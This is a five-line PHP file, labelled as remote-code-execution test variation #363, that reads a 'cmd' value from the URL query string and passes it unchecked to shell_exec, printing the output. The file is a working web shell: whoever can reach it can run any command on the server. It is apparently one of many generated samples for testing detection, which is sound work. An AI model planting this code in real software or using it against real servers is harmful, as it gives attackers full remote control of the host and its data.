<?php
// RCE test variation #363
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>